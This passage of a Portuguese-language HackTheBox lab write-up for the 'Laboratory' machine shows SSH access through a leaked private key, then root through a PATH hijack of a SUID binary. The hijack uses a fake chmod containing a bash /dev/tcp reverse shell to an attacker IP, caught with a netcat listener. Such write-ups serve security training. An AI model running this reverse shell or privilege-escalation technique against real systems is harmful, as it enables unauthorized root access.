+warning: redirecting to https://git.laboratory.htb/dexter/securedocker.git/
+remote: Enumerating objects: 10, <span class="k">done</span><span class="nb">.</span>
+remote: Counting objects: 100% <span class="o">(</span>10/10<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+remote: Compressing objects: 100% <span class="o">(</span>9/9<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+remote: Total 10 <span class="o">(</span>delta 0<span class="o">)</span>, reused 0 <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused 0
+Receiving objects: 100% <span class="o">(</span>10/10<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>tree <span class="nt">-a</span> <span class="nt">-I</span> <span class="s1">'.git'</span>
+<span class="nb">.</span>
+├── create_gitlab.sh
+├── dexter
+│   ├── recipe.url
+│   ├── .ssh
+│   │   ├── authorized_keys
+│   │   └── id_rsa
+│   └── todo.txt
+└── README.md
+
+2 directories, 6 files
+</code></pre></div></div>
+
+<p>Assim como na máquina <a href="/writeup/2021/03/htb-luanne/">Luanne</a>, realizado a conversão da chave para RSA, utilizando os comandos abaixo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">chmod </span>600 id_rsa
+<span class="nv">$ </span>ssh-keygen <span class="nt">-p</span> <span class="nt">-m</span> PEM <span class="nt">-f</span> ./id_rsa
+Key has comment <span class="s1">'root@laboratory'</span>
+Enter new passphrase <span class="o">(</span>empty <span class="k">for </span>no passphrase<span class="o">)</span>: 
+Enter same passphrase again: 
+Your identification has been saved with the new passphrase.
+</code></pre></div></div>
+
+<p>Após o procedimento mencionado, foi possível conectar-se à máquina via SSH e obter a flag a partir do usuário <code class="language-plaintext highlighter-rouge">dexter</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nv">$ </span>ssh <span class="nt">-i</span> id_rsa dexter@10.10.10.216
+  dexter@laboratory:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+  total 40
+  drwxr-xr-x 6 dexter dexter 4096 Oct 22 08:42 <span class="nb">.</span>
+  drwxr-xr-x 3 root   root   4096 Jun 26  2020 ..
+  lrwxrwxrwx 1 root   root      9 Jul 17  2020 .bash_history -&gt; /dev/null
+  <span class="nt">-rw-r--r--</span> 1 dexter dexter  220 Feb 25  2020 .bash_logout
+  <span class="nt">-rw-r--r--</span> 1 dexter dexter 3771 Feb 25  2020 .bashrc
+  drwx------ 2 dexter dexter 4096 Jun 26  2020 .cache
+  drwx------ 2 dexter dexter 4096 Oct 22 08:14 .gnupg
+  drwxrwxr-x 3 dexter dexter 4096 Jun 26  2020 .local
+  <span class="nt">-rw-r--r--</span> 1 dexter dexter  807 Feb 25  2020 .profile
+  drwx------ 2 dexter dexter 4096 Jun 26  2020 .ssh
+  <span class="nt">-r--r-----</span> 1 root   dexter   33 Feb 19 11:06 user.txt
+  dexter@laboratory:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+  &lt;redacted&gt;
+</code></pre></div></div>
+
+<h2 id="root-flag">Root flag</h2>
+
+<p>Após executar <code class="language-plaintext highlighter-rouge">linpeas.sh</code> novamente, desta vez na máquina de fato, notei que existe um arquivo SUID, com permissão atribuida para o usuário <strong>dexter</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dexter@laboratory:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /usr/local/bin/docker-security
+<span class="nt">-rwsr-xr-x</span> 1 root dexter 16720 Aug 28 14:52 /usr/local/bin/docker-security
+</code></pre></div></div>
+
+<p>Ao executar este binário, não observei nenhum output, assim como não exibe nenhum tipo de informação/ajuda usando parametros como <code class="language-plaintext highlighter-rouge">--version</code> e <code class="language-plaintext highlighter-rouge">--help</code>. Analisando o mesmo mais a fundo notei que se trata de um arquivo executável, o qual pode conter alguma informação do que se utiliza para algum eventual path hijack ou buffer overflow.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dexter@laboratory:~<span class="nv">$ </span>file /usr/local/bin/docker-security
+/usr/local/bin/docker-security: setuid ELF 64-bit LSB shared object, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]<span class="o">=</span>d466f1fb0f54c0274e5d05974e81f19dc1e76602, <span class="k">for </span>GNU/Linux 3.2.0, not stripped
+</code></pre></div></div>
+
+<p>Antes de utilizar ferramentas de disassembly, inspecionado as strings do arquivo a partir da máquina atacante (uma vez que a máquina não possui o binário <code class="language-plaintext highlighter-rouge">strings</code>) e algumas entradas chamaram a atenção, sendo elas a chamada do binário <code class="language-plaintext highlighter-rouge">chmod</code> para redefinir as permissões no diretório docker, porém sem especificar o caminho completo. Isso implica que este app <strong>é vulnerável <em>path hijacking</em></strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>strings docker-security
+<span class="o">[</span>...]
+
+<span class="o">[]</span>A<span class="se">\A</span><span class="o">]</span>A^A_
+<span class="nb">chmod </span>700 /usr/bin/docker
+<span class="nb">chmod </span>660 /var/run/docker.sock
+<span class="p">;</span><span class="k">*</span>3<span class="s2">$"
+GCC: (Debian 10.1.0-6) 10.1.0
+
+[...]
+</span></code></pre></div></div>
+
+<h3 id="path-hijack">Path hijack</h3>
+
+<p>Para obter privilégios de <code class="language-plaintext highlighter-rouge">root</code>, uma vez que o binário que possui SUID é vulnerável, o primeiro passo é criar um <code class="language-plaintext highlighter-rouge">chmod</code> <strong>falso</strong>, neste caso gerando um shell reverso, seguido da alteração do PATH para que o caminho onde o arquivo localizado seja buscado no início da execução.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dexter@laboratory:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'#!/bin/bash'</span> <span class="o">&gt;</span> /dev/shm/chmod
+dexter@laboratory:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.10.10/4443 0&gt;&amp;1'</span> <span class="o">&gt;&gt;</span> /dev/shm/chmod
+dexter@laboratory:~<span class="nv">$ </span><span class="nb">chmod</span> +x /dev/shm/chmod
+dexter@laboratory:~<span class="nv">$ PATH</span><span class="o">=</span>/dev/shm:<span class="nv">$PATH</span>
+dexter@laboratory:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
+/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
+</code></pre></div></div>
+
+<p>Após configurar um listener na porta especificada (<code class="language-plaintext highlighter-rouge">nc -lnvp 4443</code>) executado o binário <code class="language-plaintext highlighter-rouge">docker-security</code> o que retornou um shell reverso com privilégios de <strong>root</strong>, permitindo assim a obtenção da flag.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lnvp</span> 4443                                                                                             
+listening on <span class="o">[</span>any] 4443 ...
+connect to <span class="o">[</span>10.10.10.10] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.216] 44754
+root@laboratory:~# <span class="nb">id  
+id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1000<span class="o">(</span>dexter<span class="o">)</span>
+root@laboratory:~# <span class="nb">cat</span> /root/root.txt
+<span class="nb">cat</span> /root/root.txt
+&lt;redacted&gt;
+</code></pre></div></div>
+
+<p>Espero que tenham gostado!</p>
+
+<p>Vejo vocês novamente em breve! <img class="emoji" title=":smiley:" alt=":smiley:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f603.png" height="20" width="20"></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#hackthebox" class="page__taxonomy-item" rel="tag">HackTheBox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#htb-easy" class="page__taxonomy-item" rel="tag">htb-easy</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#htb-linux" class="page__taxonomy-item" rel="tag">htb-linux</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categorias: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categorias/#writeup" class="page__taxonomy-item" rel="tag">Writeup</a>
+    
+    </span>
+  </p>
+
+
+        
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Atualizado em:</strong> <time datetime="2021-04-17T13:00:00-03:00">April 17, 2021</time></p>
+
+
+      </footer>
+
+      <section id="sharelinks" class="page__share">
+  
+    <h4 class="page__share-title">Compartilhe</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?via=zerahzurc&amp;text=Hackthebox+write-up%3A+Laboratory%20https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F04%2Fhtb-laboratory%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartilhe Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F04%2Fhtb-laboratory%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartilhe Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F04%2Fhtb-laboratory%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartilhe LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+
+  <a href="whatsapp://send?text=https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F04%2Fhtb-laboratory%2F" data-action="share/whatsapp/share" class="btn btn--whatsapp" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartilhe Whatsapp"><i class="fab fa-fw fa-whatsapp" aria-hidden="true"></i><span> Whatsapp</span></a>
+
+  <a href="https://telegram.me/share/url?url=https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F04%2Fhtb-laboratory%2F&amp;text=Hackthebox+write-up%3A+Laboratory" class="btn btn--telegram" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartilhe Telegram"><i class="fab fa-fw fa-telegram-plane" aria-hidden="true"></i><span> Telegram</span></a>
+
+
+</section>
+
+
+      
+  <nav class="pagination">
+    
+    
+      <a href="/writeup/2021/04/htb-time/" class="pagination--pager" title="Hackthebox write-up: Time
+">Anterior</a>
+    
+    
+    
+      
+        <a href="/writeup/2021/04/htb-bucket/" class="pagination--pager" title="Hackthebox write-up: Bucket
+">Próxima</a>
+        
+    
+  </nav>
+
+    </div>
+
+    
+      <div class="page__comments">
+  
+  
+      <h4 class="page__comments-title">Deixe um comentário</h4>
+      <section id="utterances-comments"></section>
+    
+</div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">Talvez você também goste</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/BmkB4rb.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+
+      
+      <a href="https://davicruz.com/writeup/2021/06/htb-tenet/" rel="permalink">Hackthebox write-up: Tenet
+</a>
+      
+      
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-06-12T13:00:00-03:00">June 12, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          7 minuto(s) de leitura
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        
+        
+        <span class="page__meta-lang"><a href="/en-US/writeup/2021/04/htb-laboratory/">Read also in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Compartilhar</a>
+      </span>
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Olá pessoal!
+
+A máquina desta semana será Tenet, outra máquina Linux classificada como mediana do Hack The Box, criada por egotisticalSW.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/wHnMfBz.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+
+      
+      <a href="https://davicruz.com/writeup/2021/06/htb-scriptkiddie/" rel="permalink">Hackthebox write-up: ScriptKiddie
+</a>
+      
+      
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-06-05T13:00:00-03:00">June 5, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          4 minuto(s) de leitura
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        
+        
+        <span class="page__meta-lang"><a href="/en-US/writeup/2021/04/htb-laboratory/">Read also in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Compartilhar</a>
+      </span>
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Olá pessoal!
+
+A máquina desta semana será ScriptKiddie, outra máquina Linux classificada como fácil do Hack The Box, criada por 0xdf.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/FTjLM76.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+
+      
+      <a href="https://davicruz.com/writeup/2021/05/htb-delivery/" rel="permalink">Hackthebox write-up: Delivery
+</a>
+      
+      
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-05-22T13:00:00-03:00">May 22, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          8 minuto(s) de leitura
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        
+        
+        <span class="page__meta-lang"><a href="/en-US/writeup/2021/04/htb-laboratory/">Read also in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Compartilhar</a>
+      </span>
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Olá pessoal!
+
+A máquina desta semana será Delivery, outra máquina Linux classificada como fácil do Hack The Box, criada por ippsec.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/R2EVM1J.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+
+      
+      <a href="https://davicruz.com/writeup/2021/05/htb-ready/" rel="permalink">Hackthebox write-up: Ready
+</a>
+      
+      
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-05-15T13:00:00-03:00">May 15, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          6 minuto(s) de leitura
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        
+        
+        <span class="page__meta-lang"><a href="/en-US/writeup/2021/04/htb-laboratory/">Read also in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Compartilhar</a>
+      </span>
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Olá pessoal!
+
+A máquina desta semana será Ready, outra máquina Linux classificada como mediana do Hack The Box, criada por bertolis.
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap">
+<form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Pesquisar...">
+  </form>
+  <div id="results" class="results"></div>
+</div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- Osano - consent -->
+<script src="https://cdn.jsdelivr.net/npm/cookieconsent@3/build/cookieconsent.min.js" data-cfasync="false"></script>
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+
+    
+    <li><strong>Acompanhe no</strong></li>
+    
+
+    
+    
+    
+    <li><a href="https://www.linkedin.com/in/davicruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> Linkedin</a></li>
+    
+    
+    
+    <li><a href="https://twitter.com/zerahzurc" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+    
+    
+    
+    <li><a href="https://github.com/davi-cruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+    
+    
+    
+    <!-- Terms and Privacy -->
+    <li><a href="https://davicruz.com/termos-e-privacidade" rel="nofollow noopener noreferrer">
+        <i class="fas fa-user-shield" aria-hidden="true"></i> Termos de uso e Política Privacidade</a></li>
+    <!-- end Terms and Privacy -->
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<!-- Start Read in other languages-->
+<div class="page__footer-follow">
+  <ul>
+    
+    
+      
+    
+    
+    <li><a href="https://davicruz.com/en-US">Also available in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></li>
+    
+
+    
+
+    
+
+      
+      
+  </ul>
+</div>
+<!-- End Read in other languages-->
+
+<div class="page__footer-copyright">© 2021 Davi Cruz. Desenvolvido com <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+  <!-- start custom analytics snippet -->
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-54883666-1"></script>
+<script>
+  function EnableGTAGonConsent(){
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-54883666-1', { 'anonymize_ip': true});
+  }
+</script>
+
+<!-- Microsoft Clarity -->
+<script type="text/javascript">
+  function EnableMSClarityonConsent(){
+    (function(c,l,a,r,i,t,y){
+      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+  })(window, document, "clarity", "script", "5dnbfjo108");
+  }
+</script>
+
+<!-- end custom analytics snippet -->
+
+
+
+
+
+    <script>
+  'use strict';
+
+  (function() {
+    var commentContainer = document.querySelector('#utterances-comments');
+
+    if (!commentContainer) {
+      return;
+    }
+
+    var script = document.createElement('script');
+    script.setAttribute('src', 'https://utteranc.es/client.js');
+    script.setAttribute('repo', 'davi-cruz/davi-cruz.github.io');
+    script.setAttribute('issue-term', 'htb-laboratory');
+    script.setAttribute('theme', 'github-dark');
+    script.setAttribute('crossorigin', 'anonymous');
+
+    commentContainer.appendChild(script);
+  })();
+</script>
+
+  
+
+
+
+
+    
+<!-- Cookie Consent Management -->
+<script>
+    var strMessage = "Este website utiliza cookies para garantir a você uma melhor experiência";
+    var strDismiss = "Entendi!";
+    var strAllow = "Permitir Cookies";
+    var strDeny = "Não, obrigado!";
+    var strLink = "Saiba Mais";
+    var strHref = "https://davicruz.com/termos-e-privacidade/";
+
+    window.cookieconsent.initialise({
+        "palette": {
+            "popup": {
+                "background": "#252e39"
+            },
+            "button": {
+                "background": "transparent",
+                "text": "#008288",
+                "border": "#008288"
+            }
+        },
+        "position": "bottom-left",
+        "type": "opt-in",
+        "content": {
+            "message": strMessage,
+            "dismiss": strDismiss,
+            "allow": strAllow,
+            "deny": strDeny,
+            "link": strLink,
+            "href": strHref
+        },
+        onInitialise: function (status) {
+            var type = this.options.type;
+            var didConsent = this.hasConsented();
+            if (type == 'opt-in' && didConsent) {
+                // enable cookies
+                EnableMSClarityonConsent();
+                EnableGTAGonConsent();
+            }
+            if (type == 'opt-out' && !didConsent) {
+                // disable cookies
+            }
+        },
+        onStatusChange: function (status, chosenBefore) {
+            var type = this.options.type;
+            var didConsent = this.hasConsented();
+            if (type == 'opt-in' && didConsent) {
+                // enable cookies
+                EnableMSClarityonConsent();
+                EnableGTAGonConsent();
+            }
+            if (type == 'opt-out' && !didConsent) {
+                // disable cookies
+            }
+        },
+        onRevokeChoice: function () {
+            var type = this.options.type;
+            if (type == 'opt-in') {
+                // disable cookies
+            }
+            if (type == 'opt-out') {
+                // enable cookies
+                EnableMSClarityonConsent();
+                EnableGTAGonConsent();
+            }
+        }
+    });
+</script>
+<!-- End of Cookie Consent Management -->
+
+  </body>
+</html>
